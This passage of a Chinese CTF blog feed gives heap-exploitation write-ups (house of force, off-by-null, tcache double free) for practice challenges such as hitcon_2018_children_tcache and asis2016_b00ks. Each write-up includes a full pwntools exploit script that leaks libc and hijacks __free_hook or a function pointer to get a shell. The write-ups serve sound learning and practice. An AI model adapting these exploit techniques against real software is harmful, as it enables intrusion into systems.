class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;puts_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p32(sys_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h2><p><strong>这里我只记录用house of force的攻击手法，如果想打远程的话，要用unlink来打。</strong></p>
<h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007213240679.png" alt="image-20221007213240679"></p>
<h3 id="漏洞所在：-2"><a href="#漏洞所在：-2" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="/../img/image-20221007213427195.png" alt="image-20221007213427195"></p>
<p>存在一个后门函数</p>
<p><img src="/../img/image-20221007213259955.png" alt="image-20221007213259955"></p>
<p>然后存在v3里存了两个函数指针，然后如果选择5的话，会执行其中的函数指针。</p>
<p><img src="/../img/image-20221007213311228.png"></p>
<p>malloc申请的时候，对size(也就是v2)没有进行检查</p>
<p><img src="/../img/image-20221007213319620.png"></p>
<p>然后edit函数中，对size没有进行检查，因此这里存在堆溢出。</p>
<h3 id="大致思路：-2"><a href="#大致思路：-2" class="headerlink" title="大致思路："></a>大致思路：</h3><p>通常来说，能利用这几点的话，是打不了house of force的，因为没有top chunk的地址。但是这道题比较特殊的是我们只需要将top chunk放到函数指针的堆块即可。而top chunk和该堆块是存在固定的偏移的，也就是<code>request_size=target_addr-0x20-victim</code>中的target_addr-victim的值我们是知道的。因此并不需要知道top chunk的地址也可以完成house of force攻击。</p>
<p>1、申请一个堆块，然后利用edit中的溢出，修改top chunk的size位为0xffffffffffffffff</p>
<p>2、然后看一下top chunk和存在函数指针的那个chunk的偏移(如下图)</p>
<p><img src="/../img/image-20221007213446799.png" alt="image-20221007213446799"></p>
<p>然后再减去0x20，最后得到偏移为0x60</p>
<p>3、将top chunk更新到指针堆块的位置。</p>
<p>4、将指针堆块申请出来，写入后门地址即可。</p>
<h3 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc32.so&#x27;)</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25708)</span></span><br><span class="line">c_a=<span class="number">0x400E90</span></span><br><span class="line">c_d=<span class="number">0x400EA8</span></span><br><span class="line">c_e=<span class="number">0x400E9C</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,length,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,c_a,0x400AB8)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">add(-<span class="number">0x60</span>,<span class="string">&#x27;bbbbbc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x400D49</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007213348218.png" alt="image-20221007213348218"></p>
<p>远程用unlink打，我这里仅仅是通过这道题来演示house of force</p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>堆溢出</tag>
        <tag>house of force</tag>
      </tags>
  </entry>
  <entry>
    <title>关于off by null的学习总结</title>
    <url>/posts/6c267f9e.html</url>
    <content><![CDATA[<h1 id="off-by-null的利用思路："><a href="#off-by-null的利用思路：" class="headerlink" title="off by null的利用思路："></a>off by null的利用思路：</h1><p>off by null漏洞，顾名思义就是溢出了一个空字节，核心是让其堆块的prev inuse位溢出为0，从而认为它的低地址堆块处于了free状态，然后加以利用。</p>
<span id="more"></span>

<p>首先我们要用到四个chunk（我们只利用三个chunk，高地址的那个chunk是防止和top chunk合并的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunk <span class="number">0</span><span class="comment">#merged chunk     （不能让这个堆块在fastbin或是tcachebin中）</span></span><br><span class="line">chunk <span class="number">1</span><span class="comment">#overflow chunk&amp;&amp;spy chunk</span></span><br><span class="line">chunk <span class="number">2</span><span class="comment">#merge chunk      （不能让这个堆块在fastbin或是tcachebin中）</span></span><br><span class="line">chunk <span class="number">3</span><span class="comment">#prevent merge chunk</span></span><br></pre></td></tr></table></figure>

<p>这四个堆块对应的名字我也做了标注（就是上面的merged chunk   overflow chunk等等)</p>
<blockquote>
<p>1、先将这四个chunk都申请出来，注意merged chunk和merge chunk的大小，不能让他们在tcachebin或者fastbin中（不然就无法合并了），同时还要考虑overflow chunk的大小，因为要产生off by null，所以它的大小应该为八字节结尾（例如0x58,0x68,0x78···），然后释放掉merged chunk，为了保证接下来的合并可以顺利进行</p>
<p>2、接着编辑 overflow chunk，让他产生off by null漏洞溢出空字节到merge chunk的prev inuse位，同时把merge chunk的prev inuse位给改了（其大小要保证当前地址减去这个prev size正好能找到merged chunk（如果程序中没有编辑功能，那就将overflow chunk free掉，再申请回来写入数据造成溢出）。</p>
<p>3、然后释放掉merge chunk，此时检测到自身的prev inuse位是0，触发向前合并（先会触发向后合并，不过只要后面的那个chunk不是Top chunk就不会合并)（我个人习惯将向低地址合并称为向前合并）</p>
<p>4、最终由于merge chunk合并时直接找到了merged chunk，因此这二者之间的所有区域都处于了free状态，但是这二者之间其实还有一个<strong>spy_chunk（我把它叫做间谍堆块，因为它没有被free掉却处于了free的合并区域）</strong></p>
<p>剩下的就具体题目具体分析吧，反正接下来的利用就是要配合spy_chunk的特性（它的特性就是它出在free的区域，但是自己是没有被free掉的，然后就可以打double free、堆块重叠等等）</p>
</blockquote>
<blockquote>
<p>为什么要利用off by null让chunk的prev inuse位成0？</p>
<p>因为当前chunk的prev inuse位决定了上个堆块是否处于free状态，这也就决定着是否能够向前合并（我个人习惯将向低地址合并称为向前合并）。我们确实释放了上个堆块，但是改变的是spy_chunk的prev inuse位，不过我们现在想忽略这个spy_chunk，因此要将当前chunk的prev_size位伪造成0，来保证之后的向前合并可以正常进行。</p>
</blockquote>
<h1 id="相关题目wp"><a href="#相关题目wp" class="headerlink" title="相关题目wp"></a>相关题目wp</h1><h2 id="hitcon-2018-children-tcache"><a href="#hitcon-2018-children-tcache" class="headerlink" title="hitcon_2018_children_tcache"></a>hitcon_2018_children_tcache</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007204338075.png" alt="image-20221007204338075"></p>
<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><blockquote>
<p>strcpy函数会被00所截断，然后将字符串的末尾加上00</p>
</blockquote>
<p><img src="/../img/yMsXAuZb7VFi9Rx-1665146431266-38.png" alt="image-20220609225655542"></p>
<p>因此我们输入的大小本身不会造成溢出，但是strcpy函数最后补充的00造成了off by null。</p>
<p><img src="/../img/image-20221007204401427.png" alt="image-20221007204401427"></p>
<p>这道题bss段上存放的堆索引是0-9 从最小判断，哪个空的用哪个。</p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>先申请四个堆块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunk <span class="number">0</span><span class="comment">#size &gt;0x410</span></span><br><span class="line">chunk <span class="number">1</span><span class="comment">#overflow chunk&amp;&amp;spy chunk</span></span><br><span class="line">chunk <span class="number">2</span><span class="comment">#lead chunk size&gt;0x410</span></span><br><span class="line">chunk <span class="number">3</span><span class="comment">#prevent merge chunk</span></span><br></pre></td></tr></table></figure>

<p>然后将0,1chunk释放掉，再将1申请回来（释放0是为了接下来的合并，再把1给申请回来是因为要重新写入数据，来产生off_by_null，因为<strong>没有edit功能所以不得不这样</strong>）</p>
<p>用循环来清空一下chunk2 的prev size位（方便接下来布置数据，不然里面装的是垃圾数据），然后写入prev size位，它的大小应该能保证释放掉chunk2后，和chunk0合并（也就是chunk0加上chunk1+0x10大小）</p>
<p>然后释放掉chunk2，使chunk0和chunk2合并（处于tcachebin中的chunk是无法合并的）<strong>（chunk1本来是allocated状态，但是属于chunk0和chunk2合并的区域，因此它表面上看起来是free掉了，但实际上它是allcoated，如果有edit功能的话，就可以往一块被free掉的区域来写入数据了（因此我也管它叫做spy chunk 间谍堆块）</strong></p>
<p>但是这道题并没有edit功能。不过我们可以将chunk0申请回来，然后show 1来泄露libc地址。</p>
<p>因为unsortbin里面如果只有一个chunk，那么它的fd和bk指针都是指向了main_arena（它位于libc中），所以我们将chunk0申请回来的话，那么现在unsortedbin中的chunk则位于了chunk1的位置，chunk1可是没有被释放掉的（这意味着它里面的内容是可以被打印出来的）。如此chunk1中的fd和bk的位置就成了libc里的地址，然后show就将libc地址打印出来了。（此时的情况如下图）</p>
<p><img src="/../img/image-20221007204430252.png" alt="image-20221007204430252"></p>
<p>现在的情况是chunk1没有被释放（至少我们没有主动释放chunk1，并且bss段上依旧记录着chunk1的地址信息），但是由于之前的chunk0和chunk2将这片区域合并了，再将chunk0申请回来的话，bins中存放的就是chunk1的地址了。因此我们现在的chunk1处于了释放又没被释放的叠加态,hhh。</p>
<p>我们再申请一个chunk1大小的堆块，这样就会从当前的unsortedbin中拿，可是别忘了我们的unsortedbin中的地址就是chunk1的地址，因此bss段上就记录了两次chunk1的地址（这意味着我们可以释放同一个地址两次，尽管这道题free指针后置空了，但依旧造成了double free)</p>
<p>我们将bss段上是chunk1地址的两个堆块全部释放掉，造成double free。（效果如下）</p>
<p><img src="/../img/image-20221007204439685.png" alt="image-20221007204439685"></p>
<p>我们申请回来一个chunk,将里面的数据写成__free_hook（这个里面的数据指的就是原本fd指针的位置）</p>
<p>结果发现申请了一个chunk之后，tcachebins里面的那条链上还是有俩chunk（如下图）</p>
<p><img src="/../img/image-20221007204452069.png" alt="image-20221007204452069"></p>
<blockquote>
<p>经过<a href="https://roderickchan.github.io/">roderick</a>师傅的提示，发现是因为它自身是形成了一个环，自己指向着自己，如果不修改它的fd指针的话，即使申请一个chunk出来，然后去顺着chunk的fd找上一个chunk的时候发现还是它自己，因此这个循环永远也不会结束（如果不改变fd的话），也就是可以无限申请这个地址的堆块。如果想打破循环也就是要修改它的fd指针，此处我申请它的fd指针为__free_hook地址来打破这个循环。</p>
<p>至于为啥上面申请完后，还有俩chunk是因为先申请的chunk，再修改的fd，所以依然有两个（不过循环已经结束了）</p>
</blockquote>
<p>然后将地址在__free_hook上的chunk申请出来，写入one_gadget地址，执行free即可获取shell。</p>
<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29644</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1029)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#spy chunk</span></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#merge chunk</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#prevent chunk</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    new((<span class="number">0x47</span>-i),<span class="string">&#x27;f&#x27;</span>*(<span class="number">0x47</span>-i))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x550</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#touch off merge</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">free_hook_addr=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook_addr&#x27;</span>)</span><br><span class="line">one_gadget=[<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">new(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x50</span>,p64(free_hook_addr))</span><br><span class="line">new(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">new(<span class="number">0x50</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="/../img/image-20221007204507054.png" alt="image-20221007204507054"></p>
<h2 id="asis2016-b00ks"><a href="#asis2016-b00ks" class="headerlink" title="asis2016_b00ks"></a>asis2016_b00ks</h2><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>通过学习这道题的总结与收获有：</p>
<p>1、这道题存在off_by_null漏洞，可以利用该漏洞让结构体堆块落在我们可控的区域内，从而可以对结构体堆块中存放的chunk地址进行修改。</p>
<p>2、利用mmap申请超大内存，然后配合off_by_null修改结构体堆块中的chunk地址，执行show函数进行泄露libc基地址，同理用edit函数来劫持__free_hook，写入one_gadget。</p>
<h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007204614828.png" alt="image-20221007204614828"></p>
<h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/image-20221007204636156.png" alt="image-20221007204636156"></p>
<p>在这个函数里（已被重命名）存在off_by_null漏洞，我们输入最大字节的数据时，会多出来一个0造成了溢出。分析一下几个关键的点，然后判断一下这里能否被利用。</p>
<p>首先是程序里存在一个结构体，如下。该结构体大小为0x20字节，以最大的成员字节数作为结构体每个变量类型的基本长度，最大为8字节，因此四个变量全部八字节对齐，结构体为0x20字节。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">void</span> *book_name;</span><br><span class="line">    <span class="type">void</span> *description;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个结构体记录了两个chunk的位置（也就是两个void指针），和结构体的id以及description_chunk的大小。然后结构体的地址存储到了bss段，而结构体是单独存放在了一个chunk。<strong>（意味着一次create就会产生三个chunk，分别是存放book_name的chunk和description的chunk和结构体chunk）</strong></p>
<p>结构体的地址存储在下图的位置。</p>
<p><img src="/../img/image-20221007204647488.png" alt="image-20221007204647488"></p>
<p>同时这道题有个比较重要的变量就是author name。因为它存在off_by_null漏洞，下图是author_name的位置。<img src="/../img/9F5lswCuGDYvaMR-1665146431267-47.png" alt="image-20220603174907077"></p>
<p>距离存在结构体的地址仅仅只有0x20个字节。而我们可以往author_name里面写入0x20字节的数据，这就导致了我们是可以溢出到结构体地址一个00字节。具体情况先写个脚本跑一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12AF</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>下图就是此时利用off_by_null漏洞前的情况，此时结构体地址里是正常存放的四个成员变量。</p>
<p><img src="/../img/image-20221007204711563.png" alt="image-20221007204711563"></p>
<p>可以看见下图，存放的结构体地址的最低字节已经被修改成了00。</p>
<p><img src="/../img/image-20221007204719564.png" alt="image-20221007204719564"></p>
<h3 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h3><h4 id="平常使用show或者edit、free函数是怎么找到对应的chunk的？"><a href="#平常使用show或者edit、free函数是怎么找到对应的chunk的？" class="headerlink" title="平常使用show或者edit、free函数是怎么找到对应的chunk的？"></a>平常使用show或者edit、free函数是怎么找到对应的chunk的？</h4><p><strong>先去bss段找存放的对应结构体地址，然后去看结构体里面记录的chunk信息，再通过chunk信息（也就是chunk的地址）来找到对应的chunk</strong>。<u>现在我们已经把结构体地址给改了，如果我们能够往这个结构体地址里面写入数据，就相当于我们可以去非法进行edit、show、free了（因为可以去操作原本不存在的chunk）</u>。接下来的核心就是我们要确定是否能够往这个结构体里写入数据。</p>
<p>可以看到上图这个地址是0x000055937ccbe000。我们看一下当前两个chunk的地址。</p>
<p><img src="/../img/image-20221007204732988.png" alt="image-20221007204732988"></p>
<p>根据上图可以发现，我们现在并不能控制0x000055937ccbe000这个地址，但是我们可以控制第一个和第二个堆块（我们申请的chunk）的大小，<strong>我们只需要构造一下前两个堆块的大小，让0x000055937ccbe000这个地址落在description的这个chunk即可（因为我们edit可以编辑description这个chunk）</strong> 稍微算一下，只需要让第一个chunk大小为0xd0（调试或者自己用计算器减，都能算出来），那么就可以让0x000055937ccbe100(这里变成0x000055937ccbe100的原因是前两个堆块太的抬高，让第二字节的后半个字节进位了，但并不影响，因为覆盖的仅仅是最后一个字节成00）这个地址落在description这个chunk的范围里，这步的目的是为了接下来编辑结构体内容打下铺垫。（可以发现下图的description_chunk是从已经覆盖到了0x000055937ccbe100)</p>
<p><img src="/../img/image-20221007204742463.png" alt="image-20221007204742463"></p>
<p>接下来，我们只需用edit编辑这个chunk，然后构造一个struct_chunk即可。</p>
<p>将其中的description_chunk的地址改成free的got表，然后用show泄露它的真实地址，再用edit去修改它的真实地址？</p>
<p>我们先使用下面的脚本试试这件事情。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12af</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; 